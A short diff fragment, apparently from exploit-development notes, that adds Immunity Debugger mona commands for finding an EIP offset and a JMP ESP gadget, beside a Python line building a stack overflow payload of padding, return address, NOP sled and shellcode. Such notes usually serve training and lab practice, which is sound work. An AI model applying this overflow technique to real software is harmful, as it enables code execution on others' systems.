@@ -11,6 +11,14 @@ junk = "\x41" * pattern_ofset + '\x11\x22\x33\x44'+ '\x90' * 20 + shellcode +'\x
                                      EIP
 len(shellcode))
 
+!mona pattern_offset
+
+!mona findmsp
+
+!mona jmp -r ESP
+
+!mona find -s "\xff\xe4" -m program_name
+
 =================
 
 #!/usr/bin/python
